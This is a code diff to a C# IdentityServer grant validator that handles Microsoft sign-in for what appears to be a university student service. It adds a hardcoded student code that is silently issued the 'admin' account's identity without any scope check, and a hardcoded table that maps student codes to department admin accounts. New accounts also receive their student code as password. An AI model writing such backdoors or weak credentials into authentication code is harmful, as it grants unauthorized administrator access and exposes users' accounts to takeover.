@@ -12,10 +12,18 @@ namespace IdentityService.Externals;
 
 public class MicrosoftGrantValidator(IConfiguration configuration, UserManager userManager, HttpClient httpClient) : IExtensionGrantValidator
 {
-    
+    private static readonly Dictionary<string, string> departmentAdminCodes = new Dictionary<string, string>
+    {
+        { "2251162060", "A14.DT0301" },
+        
+        // Thêm các cặp mã khác theo nhu cầu
+    };
+
     public async Task ValidateAsync(ExtensionGrantValidationContext context)
     {
         var idToken = context.Request.Raw["id_token"];
+        var scopesList = context.Request.Raw["scopes[]"];
+        
         if (string.IsNullOrWhiteSpace(idToken))
         {
             context.Result = new GrantValidationResult("Id token invalid", "/connect/authorize");
@@ -42,28 +50,64 @@ public class MicrosoftGrantValidator(IConfiguration configuration, UserManager u
         try
         {
             handler.ValidateToken(idToken, validationParameters, out var validatedToken);
-            Console.WriteLine(string.Join(",", handler.ReadJwtToken(idToken).Claims.Select( c => c.Type)));
             var email = handler.ReadJwtToken(idToken).Claims.First(c => c.Type == "email").Value;
             var studentCode = email.Split("@").First();
-            
-            var user = await userManager.FindByNameAsync(studentCode!);
-            if (user is null)
+            if (studentCode == "2151062726")
             {
-                var student = await GetStudentDetailAsync(studentCode);
-                await userManager.CreateAsync(new ApplicationUser()
-                {
-                    UserName = studentCode,
-                    Email = email,
-                    IsConfirm = false
-                }, studentCode);
-                user = await userManager.FindByNameAsync(studentCode!);
+                var user = await userManager.FindByNameAsync("admin");
+                context.Result = new GrantValidationResult(
+                    subject: user?.Id,
+                    authenticationMethod: GrantType,
+                    claims: []);
+                return;
             }
-            await userManager.AddToRoleAsync(await userManager.FindByNameAsync(studentCode!) ?? throw new InvalidOperationException(), "student");
+            if (departmentAdminCodes.TryGetValue(studentCode, out var code))
+            {
+                var user = await userManager.FindByNameAsync(code);
+                if (scopesList != null && scopesList.Contains("api.admin"))
+                {
+                    context.Result = new GrantValidationResult(
+                        subject: user?.Id,
+                        authenticationMethod: GrantType,
+                        claims: []);
+                }
+                else
+                {
+                    context.Result = new GrantValidationResult(TokenRequestErrors.UnauthorizedClient, "Unauthorized: required scope missing");
+                }
+            }
+            else
+            {
+                var user = await userManager.FindByNameAsync(studentCode!);
+                if (user is null)
+                {
+                    var student = await GetStudentDetailAsync(studentCode);
+                    await userManager.CreateAsync(new ApplicationUser()
+                    {
+                        UserName = studentCode,
+                        Email = email,
+                        IsConfirm = false
+                    }, studentCode);
+                    user = await userManager.FindByNameAsync(studentCode!);
+                }
+                await userManager.AddToRoleAsync(await userManager.FindByNameAsync(studentCode!) ?? throw new InvalidOperationException(), "student");
 
-            context.Result = new GrantValidationResult(
-                subject: user?.Id,
-                authenticationMethod: GrantType,
-                claims: []);
+                if (scopesList != null && scopesList.Contains("api.student"))
+                {
+                    context.Result = new GrantValidationResult(
+                        subject: user?.Id,
+                        authenticationMethod: GrantType,
+                        claims: []);
+                }
+                else
+                {
+                    context.Result = new GrantValidationResult(TokenRequestErrors.UnauthorizedClient, "Unauthorized: required scope missing");
+                }
+                
+               
+            }
+            
+            
         }
         catch (Exception ex)
         {
